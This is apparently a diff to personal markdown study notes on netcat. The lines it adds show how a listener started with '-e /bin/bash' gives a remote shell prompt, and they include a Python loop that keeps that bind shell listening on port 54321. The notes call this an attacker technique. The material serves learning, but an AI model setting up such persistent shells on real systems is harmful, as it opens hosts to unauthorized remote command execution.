@@ -150,32 +150,29 @@ nc is a tool that allows us to collect data from a service
 {server} ~$ nc 192.168.118.100 54321
 ~$ hello
 - you get an error, because there is no hello command
+- *If you give a command like*: ls /
+	- You will see everything in the directory
+	- You essentially have a working prompt
 
+**This is a tool often used by attackers to gain access to the filesystem**
 
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
+#### python
+{Kali} ~$ python
+``` python
+import os
+while True:
+	os.system("nc -l -p 54321 -e /bin/bash")
+			# Hit enter again so it runs
+```
+- *Expect it to look like nothings happening*
+
+{Server} ~$ nc 192.168.118.100 54321
+- Enter any command
+*Quits the session*
+- ^c
+
+On the code side {kali} we're still in a loop, so it's going to keep running
+
+**Essentially**: You can keep running the same NC command without having to worry about the listening port closing on the workstation, since we're using a python loop
+
+*On the workstation, you have to hit ^z to stop the loop*
